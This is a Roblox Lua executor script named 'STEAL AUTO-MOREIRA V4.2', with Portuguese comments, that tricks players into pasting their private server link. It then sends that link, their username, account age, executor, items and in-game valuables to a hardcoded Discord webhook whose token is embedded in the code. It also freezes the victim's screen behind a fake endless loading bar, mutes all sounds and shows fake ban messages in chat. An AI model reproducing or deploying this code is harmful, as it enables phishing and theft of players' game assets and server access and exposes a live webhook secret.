--[[
═══════════════════════════════════════════════════════════════════════════
    🎭 STEAL AUTO-MOREIRA V4.2
    Sistema completo de troll com detecção de brainrots
    
    Features:
    • Animação suave de entrada
    • Validação de link de servidor privado
    • Loading infinito (50% = 1 hora até 100%)
    • Detecção completa de 181 brainrots
    • Bloqueio total de controles
    • Silenciamento de todos os sons
    • Mensagens fake no chat
    • Webhook Discord com todas as informações
═══════════════════════════════════════════════════════════════════════════
]]

-- Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")

local LocalPlayer = Players.LocalPlayer
local WEBHOOK = "https://discord.com/api/webhooks/1429599742790471830/sBVd_F8fQ4-FxRJPIWKCQI0z3Q9QBvJwlWMks1YbiSB2TdN6-r_zuellMhgbLyRJ5C2V"

-- Database de 181 Brainrots (nome e valor MPS)
local BrainrotData = {
    {n="Noobini Pizzanini",v=1},{n="Lirili Larila",v=3},{n="Tim Cheese",v=5},{n="Fluriflura",v=7},{n="Talpa Di Fero",v=9},
    {n="Svinina Bombardino",v=10},{n="Raccooni Jandelini",v=12},{n="Pipi Kiwi",v=13},{n="Pipi Corni",v=14},{n="Trippi Troppi",v=20},
    {n="Gangster Footera",v=30},{n="Bandito Bobritto",v=35},{n="Boneca Ambalabu",v=40},{n="Cacto Hipopotamo",v=50},{n="Ta Ta Ta Ta Sahur",v=55},
    {n="Tric Trac Barabroom",v=65},{n="Pipi Avocado",v=70},{n="Cappuccino Assasino",v=75},{n="Bandito Axolito",v=90},{n="Brr Brr Patapim",v=100},
    {n="Avocadini Antilopini",v=115},{n="Trulimero Trulicina",v=125},{n="Bambini Crostini",v=135},{n="Malame Amarele",v=140},{n="Bananita Dolphinita",v=150},
    {n="Perochello Lemonchello",v=160},{n="Brri Brri Bicus Dicus Bombicus",v=175},{n="Avocadini Guffo",v=225},{n="Ti Ti Ti Sahur",v=225},{n="Mangolini Parrocini",v=235},
    {n="Salamino Penguino",v=250},{n="Penguino Cocosino",v=300},{n="Frogato Pirato",v=240},{n="Burbaloli Loliloli",v=200},{n="Chimpanzini Bananini",v=300},
    {n="Tirilikalika Tirilikalako",v=450},{n="Ballerina Cappuccina",v=500},{n="Chef Crabracadabra",v=600},{n="Lionel Cactuseli",v=650},{n="Glorbo Fruttodrillo",v=750},
    {n="Quivioli Ameleonni",v=900},{n="Blueberrinni Octopusini",v=1000},{n="Caramello Filtrello",v=1050},{n="Pipi Potato",v=1100},{n="Strawberrelli Flamingelli",v=1150},
    {n="Cocosini Mama",v=1200},{n="Pandaccini Bananini",v=1250},{n="Pi Pi Watermelon",v=1300},{n="Signore Carapace",v=1325},{n="Sigma Boy",v=1350},
    {n="Sigma Girl",v=1800},{n="Frigo Camelo",v=1900},{n="Orangutini Ananassini",v=2000},{n="Rhino Toasterino",v=2150},{n="Bombardiro Crocodilo",v=2500},
    {n="Brutto Gialutto",v=3000},{n="Spioniro Golubiro",v=3500},{n="Bombombini Gusini",v=5000},{n="Zibra Zubra Zibralini",v=6000},{n="Tigrilini Watermelini",v=6500},
    {n="Avocadorilla",v=7000},{n="Cavallo Virtuoso",v=7500},{n="Gorillo Subwoofero",v=7750},{n="Gorilla Watermelondrillo",v=8000},{n="Tob Tobi Tobi",v=8500},
    {n="Lerulerulerule",v=8750},{n="Ganganzelli Trulala",v=9000},{n="Te Te Te Sahur",v=9500},{n="Rhino Helicopterino",v=11000},{n="Tracoducotulu Delapeladustuz",v=12000},
    {n="Los Noobinis",v=12500},{n="Carloo",v=13500},{n="Elephanto Frigo",v=14000},{n="Carrotini Brainini",v=15000},{n="Cocofanto Elefanto",v=17500},
    {n="Antonio",v=18500},{n="Girafa Celestre",v=20000},{n="Gattatino Nyanino",v=35000},{n="Chihuanini Taconini",v=45000},{n="Tralalero Tralala",v=50000},
    {n="Matteo",v=50000},{n="Los Crocodillitos",v=55000},{n="Tigroligre Frutonni",v=60000},{n="Espresso Signora",v=70000},{n="Odin Din Din Dun",v=75000},
    {n="Unclito Samito",v=75000},{n="Tipi Topi Taco",v=75000},{n="Alessio",v=85000},{n="Tralalita Tralala",v=100000},{n="Tukanno Bananno",v=100000},
    {n="Orcalero Orcala",v=100000},{n="Extinct Ballerina",v=125000},{n="Trenostruzzo Turbo 3000",v=150000},{n="Urubini Flamenguini",v=150000},{n="Capi Taco",v=155000},
    {n="Gattito Tacoto",v=165000},{n="Trippi Troppi Troppa Trippa",v=175000},{n="Las Cappuchinas",v=185000},{n="Ballerino Lololo",v=200000},{n="Bulbito Bandito Traktorito",v=205000},
    {n="Los Tungtungtungcitos",v=210000},{n="Pakrahmatmamat",v=215000},{n="Los Bombinitos",v=220000},{n="Piccione Macchina",v=225000},{n="Brr es Teh Patipum",v=225000},
    {n="Pakrahmatmatina",v=225000},{n="Bombardini Tortini",v=225000},{n="Tractoro Dinosauro",v=230000},{n="Los Orcalitos",v=235000},{n="Crabbo Limonetta",v=235000},
    {n="Cacasito Satalito",v=240000},{n="Orcalita Orcala",v=240000},{n="Tartaruga Cisterna",v=250000},{n="Corn Corn Corn Sahur",v=250000},{n="Dug Dug Dug",v=255000},
    {n="Los Tipi Tacos",v=260000},{n="Piccionetta Macchina",v=270000},{n="Bambu Bambu Sahur",v=275000},{n="Mastodontico Telepiedone",v=275000},{n="Anpali Babel",v=280000},
    {n="Belula Beluga",v=290000},{n="Krupuk Pagi Pagi",v=290000},{n="La Vacca Saturno Saturnita",v=300000},{n="Bisonte Giuppitere",v=300000},{n="Karkerkar Kurkur",v=300000},
    {n="Los Matteos",v=300000},{n="Trenostruzzo Turbo 4000",v=310000},{n="Sammyni Spyderini",v=325000},{n="Torrtuginni Dragonfrutini",v=350000},{n="Dul Dul Dul",v=375000},
    {n="Blackhole Goat",v=400000},{n="Chachechi",v=400000},{n="Agarrini la Palini",v=425000},{n="Los Spyderinis",v=425000},{n="Fragola la la la",v=450000},
    {n="Extinct Tralalero",v=450000},{n="La Cucaracha",v=475000},{n="Los Tralaleritos",v=500000},{n="Guerriro Digitale",v=550000},{n="La Karkerkar Combinasion",v=600000},
    {n="Extinct Matteo",v=625000},{n="Las Tralaleritas",v=650000},{n="Job Job Job Sahur",v=700000},{n="Las Vaquitas Saturnitas",v=750000},{n="Graipuss Medussi",v=1000000},
    {n="Noo My Hotspot",v=1500000},{n="La Sahur Combinasion",v=2000000},{n="To to to Sahur",v=2200000},{n="Pot Hotspot",v=2500000},{n="Quesadilla Crocodila",v=3000000},
    {n="Chicleteira Bicicleteira",v=3500000},{n="Los Nooo My Hotspotsitos",v=5000000},{n="Los Chicleteiras",v=7000000},{n="67",v=7500000},{n="La Grande Combinasion",v=10000000},
    {n="Mariachi Corazoni",v=12500000},{n="Los Combinasionas",v=15000000},{n="Nuclearo Dinossauro",v=15000000},{n="Tacorita Bicicleta",v=16500000},{n="Las Sis",v=17500000},
    {n="Los Hotspotsitos",v=20000000},{n="Celularcini Viciosini",v=22500000},{n="La Extinct Grande",v=23500000},{n="Los Bros",v=24000000},{n="Tralaledon",v=27500000},
    {n="Esok Sekolah",v=30000000},{n="Los Tacoritas",v=32000000},{n="Ketupat Kepat",v=35000000},{n="Tictac Sahur",v=37500000},{n="La Supreme Combination",v=40000000},
    {n="Ketchuru and Masturu",v=42500000},{n="Garama and Madundung",v=50000000},{n="Spaghetti Tualetti",v=60000000},{n="Ondel Ondel Sahur",v=75000000},{n="Dragon Cannelloni",v=100000000},
    {n="Batik Ketimun",v=125000000},{n="Strawberry Elephant",v=250000000},{n="Meowl",v=500000000}
}

-- Nomes e mensagens fake
local FakeNames={"xX_ProGamer_Xx","NoobMaster69","ShadowKnight","DragonSlayer","CoolDude123","EpicPlayer","LegendKiller","DarkAssassin"}
local FakeMsgs={" entrou [BASE VAZIA] BLOQUEADO!"," foi detectado roubando - KICKADO!"," tentou usar exploit - BANIDO!"," perdeu todos os brainrots - LOL!"," foi pego pelo anti-cheat!"}

-- Formatar números
local function Fmt(n)
    if n>=1e9 then return string.format("$%.1fB",n/1e9)
    elseif n>=1e6 then return string.format("$%.1fM",n/1e6)
    elseif n>=1e3 then return string.format("$%.1fK",n/1e3)
    else return "$"..n end
end

-- Detectar brainrots
local function DetectBrainrots()
    local found={}
    local locs={workspace:FindFirstChild(LocalPlayer.Name),workspace:FindFirstChild("Bases"),workspace:FindFirstChild("PlayerBases"),workspace:FindFirstChild("Brainrots")}
    for _,loc in pairs(locs) do
        if loc then
            for _,obj in pairs(loc:GetDescendants()) do
                for _,br in pairs(BrainrotData) do
                    if obj.Name==br.n or obj.Name:match(br.n) then
                        if found[br.n] then found[br.n].c=found[br.n].c+1
                        else found[br.n]={n=br.n,v=br.v,c=1} end
                    end
                end
            end
        end
    end
    return found
end

-- Enviar webhook
local function SendWebhook(link)
    local brs=DetectBrainrots()
    local brList,total={},0
    for _,d in pairs(brs) do
        total=total+d.c
        table.insert(brList,string.format("• %s (x%d) - %s/s",d.n,d.c,Fmt(d.v)))
    end
    table.sort(brList)
    local brTxt=#brList>0 and table.concat(brList,"\n") or "❌ Nenhum"
    
    local items={}
    if LocalPlayer.Character then
        for _,i in pairs(LocalPlayer.Character:GetDescendants()) do
            if i:IsA("Tool") then table.insert(items,i.Name) end
        end
    end
    local itemTxt=#items>0 and table.concat(items,", ") or "❌ Nenhum"
    
    pcall(function()
        request({
            Url=WEBHOOK,
            Method="POST",
            Headers={["Content-Type"]="application/json"},
            Body=HttpService:JSONEncode({
                ["embeds"]={{
                    ["title"]="🎭 NOVO USUÁRIO TROLLADO!",
                    ["description"]="**STEAL AUTO-MOREIRA V4.2**\n\n🧠 **"..total.." Brainrots detectados!**",
                    ["color"]=16711680,
                    ["fields"]={
                        {["name"]="👤 Nome de usuário",["value"]=LocalPlayer.Name.." (@"..LocalPlayer.DisplayName..")"},
                        {["name"]="📅 Idade da conta",["value"]=LocalPlayer.AccountAge.." dias"},
                        {["name"]="⏰ Horário de execução",["value"]=os.date("%d/%m/%Y %H:%M:%S")},
                        {["name"]="🔧 Executor",["value"]=identifyexecutor and identifyexecutor() or "Unknown"},
                        {["name"]="🔗 Private Server Link",["value"]="```"..(link or "Não fornecido").."```"},
                        {["name"]="🎒 Itens",["value"]="```"..itemTxt.."```"},
                        {["name"]="🧠 Brainrots ("..total..") [Nome e Valor]",["value"]="```\n"..brTxt.."```"}
                    },
                    ["footer"]={["text"]="STEAL AUTO-MOREIRA V4.2"},
                    ["timestamp"]=os.date("!%Y-%m-%dT%H:%M:%S"),
                    ["thumbnail"]={["url"]="https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"}
                }}
            })
        })
    end)
end

-- Criar GUI
local sg=Instance.new("ScreenGui")
sg.Name="StealAutoMoreira"
sg.ResetOnSpawn=false
sg.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
sg.IgnoreGuiInset=true
sg.Parent=gethui and gethui() or game:GetService("CoreGui")

local overlay=Instance.new("Frame")
overlay.Size=UDim2.new(1,0,1,0)
overlay.BackgroundColor3=Color3.fromRGB(0,0,0)
overlay.BackgroundTransparency=1
overlay.BorderSizePixel=0
overlay.Parent=sg

local main=Instance.new("Frame")
main.Size=UDim2.new(0,450,0,250)
main.Position=UDim2.new(0.5,-225,1.5,0)
main.BackgroundColor3=Color3.fromRGB(25,25,30)
main.BorderSizePixel=0
main.Parent=sg

local c1=Instance.new("UICorner")
c1.CornerRadius=UDim.new(0,15)
c1.Parent=main

local title=Instance.new("TextLabel")
title.Size=UDim2.new(1,-40,0,50)
title.Position=UDim2.new(0,20,0,20)
title.BackgroundTransparency=1
title.Text="Enter your private server link to stay"
title.TextColor3=Color3.fromRGB(255,255,255)
title.TextSize=20
title.Font=Enum.Font.GothamBold
title.TextWrapped=true
title.Parent=main

local tbox=Instance.new("TextBox")
tbox.Size=UDim2.new(1,-60,0,45)
tbox.Position=UDim2.new(0,30,0,100)
tbox.BackgroundColor3=Color3.fromRGB(35,35,40)
tbox.BorderSizePixel=0
tbox.PlaceholderText="https://www.roblox.com/share?code=..."
tbox.PlaceholderColor3=Color3.fromRGB(150,150,150)
tbox.Text=""
tbox.TextColor3=Color3.fromRGB(255,255,255)
tbox.TextSize=14
tbox.Font=Enum.Font.Gotham
tbox.Parent=main

local c2=Instance.new("UICorner")
c2.CornerRadius=UDim.new(0,8)
c2.Parent=tbox

local btn=Instance.new("TextButton")
btn.Size=UDim2.new(0,150,0,40)
btn.Position=UDim2.new(0.5,-75,0,170)
btn.BackgroundColor3=Color3.fromRGB(70,130,255)
btn.BorderSizePixel=0
btn.Text="ENTER"
btn.TextColor3=Color3.fromRGB(255,255,255)
btn.TextSize=18
btn.Font=Enum.Font.GothamBold
btn.Parent=main

local c3=Instance.new("UICorner")
c3.CornerRadius=UDim.new(0,10)
c3.Parent=btn

-- Animações
local function AnimEntry()
    TweenService:Create(overlay,TweenInfo.new(0.5),{BackgroundTransparency=0.7}):Play()
    wait(0.2)
    TweenService:Create(main,TweenInfo.new(0.8,Enum.EasingStyle.Back,Enum.EasingDirection.Out),{Position=UDim2.new(0.5,-225,0.5,-125)}):Play()
end

local function ValidLink(l)
    return l:match("roblox%.com/share%?code=") and l:match("type=Server")
end

-- Tela de loading
local function CreateLoading(link)
    main:Destroy()
    TweenService:Create(overlay,TweenInfo.new(0.3),{BackgroundTransparency=0}):Play()
    wait(0.3)
    
    UserInputService.MouseIconEnabled=false
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All,false)
    for _,s in pairs(game:GetDescendants()) do if s:IsA("Sound") then pcall(function() s.Volume=0 end) end end
    
    local load=Instance.new("Frame")
    load.Size=UDim2.new(0,500,0,200)
    load.Position=UDim2.new(0.5,-250,0.5,-100)
    load.BackgroundColor3=Color3.fromRGB(20,20,25)
    load.BorderSizePixel=0
    load.Parent=sg
    
    local c4=Instance.new("UICorner")
    c4.CornerRadius=UDim.new(0,15)
    c4.Parent=load
    
    local ltitle=Instance.new("TextLabel")
    ltitle.Size=UDim2.new(1,-40,0,50)
    ltitle.Position=UDim2.new(0,20,0,30)
    ltitle.BackgroundTransparency=1
    ltitle.Text="STEAL AUTO-MOREIRA V4.2"
    ltitle.TextColor3=Color3.fromRGB(70,130,255)
    ltitle.TextSize=24
    ltitle.Font=Enum.Font.GothamBold
    ltitle.Parent=load
    
    local pbg=Instance.new("Frame")
    pbg.Size=UDim2.new(1,-80,0,30)
    pbg.Position=UDim2.new(0,40,0,110)
    pbg.BackgroundColor3=Color3.fromRGB(35,35,40)
    pbg.BorderSizePixel=0
    pbg.Parent=load
    
    local c5=Instance.new("UICorner")
    c5.CornerRadius=UDim.new(0,8)
    c5.Parent=pbg
    
    local pf=Instance.new("Frame")
    pf.Size=UDim2.new(0,0,1,0)
    pf.BackgroundColor3=Color3.fromRGB(70,130,255)
    pf.BorderSizePixel=0
    pf.Parent=pbg
    
    local c6=Instance.new("UICorner")
    c6.CornerRadius=UDim.new(0,8)
    c6.Parent=pf
    
    local pct=Instance.new("TextLabel")
    pct.Size=UDim2.new(1,0,0,30)
    pct.Position=UDim2.new(0,0,0,155)
    pct.BackgroundTransparency=1
    pct.Text="0%"
    pct.TextColor3=Color3.fromRGB(255,255,255)
    pct.TextSize=16
    pct.Font=Enum.Font.GothamBold
    pct.Parent=load
    
    local chat=Instance.new("ScrollingFrame")
    chat.Size=UDim2.new(0,400,0,150)
    chat.Position=UDim2.new(0,20,1,-170)
    chat.BackgroundColor3=Color3.fromRGB(20,20,25)
    chat.BackgroundTransparency=0.3
    chat.BorderSizePixel=0
    chat.ScrollBarThickness=4
    chat.CanvasSize=UDim2.new(0,0,0,0)
    chat.Parent=sg
    
    local c7=Instance.new("UICorner")
    c7.CornerRadius=UDim.new(0,10)
    c7.Parent=chat
    
    local cl=Instance.new("UIListLayout")
    cl.Padding=UDim.new(0,5)
    cl.Parent=chat
    
    SendWebhook(link)
    
    task.spawn(function()
        local p,s=0,1.5
        while true do
            if p<50 then p=p+s if p>=50 then p=50 s=0.0139 end
            else p=p+s if p>=99.9 then p=99.9 end end
            pct.Text=string.format("%.1f%%",p)
            TweenService:Create(pf,TweenInfo.new(0.3),{Size=UDim2.new(p/100,0,1,0)}):Play()
            if math.random(1,100)<=5 then
                local m=Instance.new("TextLabel")
                m.Size=UDim2.new(1,-10,0,20)
                m.BackgroundTransparency=1
                m.Text="[@"..FakeNames[math.random(#FakeNames)].."]"..FakeMsgs[math.random(#FakeMsgs)]
                m.TextColor3=Color3.fromRGB(255,100,100)
                m.TextSize=12
                m.Font=Enum.Font.Gotham
                m.TextXAlignment=Enum.TextXAlignment.Left
                m.Parent=chat
                chat.CanvasSize=UDim2.new(0,0,0,cl.AbsoluteContentSize.Y)
                chat.CanvasPosition=Vector2.new(0,cl.AbsoluteContentSize.Y)
                if #chat:GetChildren()>15 then chat:GetChildren()[2]:Destroy() end
            end
            wait(0.1)
        end
    end)
    
    task.spawn(function()
        while true do
            for _,s in pairs(game:GetDescendants()) do if s:IsA("Sound") then pcall(function() s.Volume=0 end) end end
            wait(1)
        end
    end)
end

-- Eventos
btn.MouseEnter:Connect(function() TweenService:Create(btn,TweenInfo.new(0.2),{BackgroundColor3=Color3.fromRGB(90,150,255)}):Play() end)
btn.MouseLeave:Connect(function() TweenService:Create(btn,TweenInfo.new(0.2),{BackgroundColor3=Color3.fromRGB(70,130,255)}):Play() end)
btn.MouseButton1Click:Connect(function()
    local l=tbox.Text
    if ValidLink(l) or l~="" then CreateLoading(l)
    else
        local op=tbox.Position
        for i=1,5 do tbox.Position=op+UDim2.new(0,math.random(-10,10),0,0) wait(0.05) end
        tbox.Position=op
        tbox.PlaceholderText="❌ Please enter a link!"
        tbox.PlaceholderColor3=Color3.fromRGB(255,100,100)
        wait(2)
        tbox.PlaceholderText="https://www.roblox.com/share?code=..."
        tbox.PlaceholderColor3=Color3.fromRGB(150,150,150)
    end
end)
tbox.FocusLost:Connect(function(e) if e then btn.MouseButton1Click:Fire() end end)

if not LocalPlayer.Character then LocalPlayer.CharacterAdded:Wait() end
AnimEntry()
print("🎭 STEAL AUTO-MOREIRA V4.2 - Ready!")
